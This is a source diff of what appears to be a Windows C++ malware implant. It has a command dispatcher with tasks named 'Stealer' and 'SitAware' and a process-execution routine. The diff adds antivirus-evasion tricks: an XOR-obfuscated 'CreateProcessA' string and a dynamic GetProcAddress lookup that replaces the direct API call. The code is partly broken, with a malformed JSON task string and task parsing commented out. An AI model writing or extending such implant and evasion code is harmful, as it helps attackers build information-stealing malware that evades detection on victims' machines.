@@ -5,11 +5,33 @@
 #include <iostream>
 #include <windows.h>
 #include "nlohmann\json.hpp"
+#include "obfuscate.h"
 
 using json = nlohmann::json;
 
 void task_do(json task);
 void task_dispatcher(char * body);
+
+/* example of how to obfuscate*/
+void tester(){
+     HMODULE hModule = LoadLibraryA("User32.dll");
+    if( hModule == NULL){
+        printf("Failed to get handle to User32.dll Because of %d\n", GetLastError());
+       
+    }
+    _CreateProcessA f = NULL;
+    std::string s = std::string("zK\\XM\\iKVZ\\JJx");
+    char buf[s.size()];
+    s.copy(buf, s.size(), 0);
+    encryptDecrypt(buf);
+    LPCSTR exp = buf; 
+    printf("%s", exp);
+    if (hModule != NULL){
+        f = (_CreateProcessA)(GetProcAddress(hModule, exp));
+    }
+    FreeLibrary(hModule);
+
+}
 /* main execute function*/
 char * execute(char * program, char *args, char* outfile){
      LPSTR cmdBuffer = (char *)malloc(1000 * sizeof(char));
@@ -34,7 +56,33 @@ char * execute(char * program, char *args, char* outfile){
     // Dead squirrels 
     ZeroMemory(&pi, sizeof(pi));
     int retVal;
-
+    
+    
+    HMODULE hModule = LoadLibraryA("User32.dll");
+    if( hModule == NULL){
+        printf("Failed to get handle to User32.dll Because of %d\n", GetLastError());
+        return 0 ;
+    }
+    printf("after loading\n");
+    _CreateProcessA f = NULL;
+    LPCSTR exp = hide("zK\\XM\\iKVZ\\JJx"); 
+    printf("%s", exp);
+    if (hModule != NULL){
+        f = (_CreateProcessA)(GetProcAddress(hModule, "CreateProcessA"));
+        if( f != NULL){
+            retVal = (*f)(NULL,        // Command line
+        cmdBuffer,
+        NULL,           // Process handle not inheritable
+        NULL,           // Thread handle not inheritable
+        FALSE,          // Set handle inheritance to TRUE binheritance
+        0,              // No creation flags
+        NULL,           // Use parent's environment block
+        NULL,           // Use parent's starting directory 
+        &si,            // Pointer to STARTUPINFO structure
+        &pi );
+        }
+    }
+    /*
     retVal = CreateProcessA(    // No module name (use command line)
         NULL,        // Command line
         cmdBuffer,
@@ -46,7 +94,7 @@ char * execute(char * program, char *args, char* outfile){
         NULL,           // Use parent's starting directory 
         &si,            // Pointer to STARTUPINFO structure
         &pi ) ;          // Pointer to PROCESS_INFORMATION structure
-    
+    */
     if (retVal == 0){
         printf("Create process failed\n");
         exit(0);
@@ -107,13 +155,13 @@ char ** jsonParse(){
 void tasks_dispatch(const char * body){
     
     json tasks = json::parse(body); //json array of tasks
-    json tasks_arr = tasks["Tasks"];
+    //json tasks_arr = tasks["Tasks"];
     int numTasks = tasks["NumTasks"];
     char * comm;
     char * args;
     json task;
     for (int i = 0; i < numTasks; i ++){
-        task = json::parse( tasks_arr[i]);
+        //task = json::parse( tasks_arr[i]);
         task_do(task);
         //get results
     }
@@ -167,7 +215,9 @@ int main(int argc, char* argv[]){
     std::string args = "";
     //(*p)(args);
     const char * ex = "{\"Tasks: [  {  \"{\"cmd\": \"Stealer\", \"args\": \"\"}, {  {\"cmd\": \"SitAware\", \"args\": \"\"}}  }   ]\", \"NumTasks\": 2}";
-    tasks_dispatch(ex);
+    //tasks_dispatch(ex);
+   tester();
+
     
 
 
